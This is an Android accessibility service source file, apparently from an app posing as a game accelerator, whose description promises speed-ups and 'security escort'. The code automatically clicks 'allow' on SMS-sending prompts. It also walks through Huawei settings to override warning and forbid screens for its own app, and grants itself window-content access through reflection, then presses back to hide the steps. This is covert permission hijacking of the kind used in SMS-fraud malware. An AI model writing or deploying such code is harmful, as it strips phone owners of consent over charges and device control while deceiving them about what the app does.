package com.UU.myaccessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.UU.uuaccelerator.Utils.AccessiblityHandler;
import com.UU.uuaccelerator.Utils.ComponentHandler;
import com.UU.uuaccelerator.Utils.SharedUtils;
import com.UU.uuaccelerator.common.Constant;

import java.lang.reflect.Field;

public class UUAccessibilityService extends AccessibilityService {

    public UUAccessibilityService() {
        Log.e("SKY", "00000000000000000");
    }



    private static final String TAG = UUAccessibilityService.class.getName();
    public static boolean isFirst = false;
    private static int counter;
    private static int reCou;
    private AccessiblityHandler accessiblityHandler;
    Handler handler = new Handler();

    @SuppressLint("NewApi")
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // TODO Auto-generated method stub
        if (getPackageName().equals(event.getPackageName())) {//加速游戏
            accessiblityHandler.clickPerantItemByText(getRootInActiveWindow(),
                    Constant.accessibility_speed_up);
        }
        if (getRootInActiveWindow() != null) {

            Log.e("AccessibilityEvent", getRootInActiveWindow().toString());
        }
        if ((//允许发送
                accessiblityHandler
                        .findItemFromText(
                                getRootInActiveWindow(),
                                Constant.accessibility_send_SMS).size() > 0)) {

            accessiblityHandler.clickPerantItemByText(getRootInActiveWindow(),
                    Constant.accessibility_allow);
        }

        if (counter == 0) {

            boolean b = ComponentHandler.getInstance().goHuaWeiSetting(
                    getApplicationContext());
            if (b) {

                counter = 1;
            } else {

                performGlobalAction(GLOBAL_ACTION_BACK);
                counter = -2;
            }
        }
        if (counter == 1) {
            boolean b = accessiblityHandler.clickPerantItemByText(
                    getRootInActiveWindow(),
                    Constant.accessibility_app);
            if (b) {
                counter = 2;
            }
        }
        if (counter == 2) {

            boolean b = accessiblityHandler.clickPerantItemByText(
                    getRootInActiveWindow(),
                    Constant.ACCESSIBILITY_ACTION_APP_NAME);
            if (b) {
                counter = 3;
            } else {
                accessiblityHandler
                        .listViewScollAction(getRootInActiveWindow());
            }
        }
        if (counter == 3) {
            if (accessiblityHandler.findItemFromText(getRootInActiveWindow(),
                    Constant.accessibility_warning)
                    .size() > 0
                    || accessiblityHandler.findItemFromText(
                    getRootInActiveWindow(),
                    Constant.accessibility_forbid).size() > 0) {

                boolean b = accessiblityHandler.clickPerantItemByText(
                        getRootInActiveWindow(),
                        Constant.accessibility_allow_app);
//				counter = 4;
//				performGlobalAction(GLOBAL_ACTION_BACK);
                SharedUtils.saveAppPower(getApplicationContext(), b);
                performGlobalAction(GLOBAL_ACTION_BACK);
                counter = 4;
            }
        }

        if ((counter == 4 || counter == -2) && isFirst) {

            if (accessiblityHandler.findItemFromText(getRootInActiveWindow(),
                    Constant.accessibility_function)
                    .size() > 0
                    && accessiblityHandler.findItemFromText(
                    getRootInActiveWindow(),
                    Constant.accessibility_server).size() > 0) {
                boolean b = performGlobalAction(GLOBAL_ACTION_BACK);
                isFirst = false;
                counter = -1;
                reCou = -1;

            } else {
                if (reCou >= 0) {

                    performGlobalAction(GLOBAL_ACTION_BACK);
                    reCou--;
                } else {
                    isFirst = false;
                    counter = -1;
                    reCou = -1;
                }
            }
        }

        if (reCou >= -5 && reCou < -1) {

            if (accessiblityHandler.findItemFromText(getRootInActiveWindow(),
                    Constant.accessibility_function)
                    .size() > 0
                    && accessiblityHandler.findItemFromText(
                    getRootInActiveWindow(),
                    Constant.accessibility_server).size() > 0) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                isFirst = false;
                counter = -1;
                reCou = -1;
            } else {

                performGlobalAction(GLOBAL_ACTION_BACK);
                reCou++;

            }

        }


    }

    @Override
    protected void onServiceConnected() {
        // TODO Auto-generated method stub
        super.onServiceConnected();

        if (accessiblityHandler == null) {
            accessiblityHandler = AccessiblityHandler.getInstance();
        }
        if (isFirst) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
            counter = 0;
            reCou = 6;
        }

    }

    private AccessibilityServiceInfo getMyInfo() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
//        info.setCapabilities(AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT);//mCapabilities int
//        info.getDescription();//mNonLocalizedDescription  String

        try {
            Log.e("SKY", "11111111111111111");
            setValue(info, "mCapabilities", AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT);
            setValue(info, "mNonLocalizedDescription", "点击右上角「开关」开启↗↗↗\n" +
                    "\n" +
                    "开启后，游戏加速器将自动完成以下服务设置:\n" +
                    " 1.完成加速器的必要权限\n" +
                    " 2.系统级加速守护\n" +
                    " 3.安全软件护航\n" +
                    " 4.其他服务\n" +
                    " 5.Test");

            String des = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
                des = info.getDescription();
            }
            Log.e("SKY", "des = " + des);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }

        return info;
    }

    /***
     * 设置私有成员变量的值
     */
    public static void setValue(Object instance, String fileName, Object value)
            throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {

        Field field = instance.getClass().getDeclaredField(fileName);
        field.setAccessible(true);
        field.set(instance, value);
    }

    @Override
    public void onCreate() {
        // TODO Auto-generated method stub
        super.onCreate();
        Log.e("SKY", "2222222222222222222222");

        setServiceInfo(getMyInfo());

        accessiblityHandler = AccessiblityHandler.getInstance();
        if (!SharedUtils.getAppPower(getApplicationContext())) {
            counter = 0;
            reCou = 6;
        } else {
            counter = -1;
            reCou = -5;
        }
    }

    @Override
    public void onInterrupt() {
        // TODO Auto-generated method stub
    }

    @Override
    public void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
        // unregisterReceiver(receiver);
    }

}
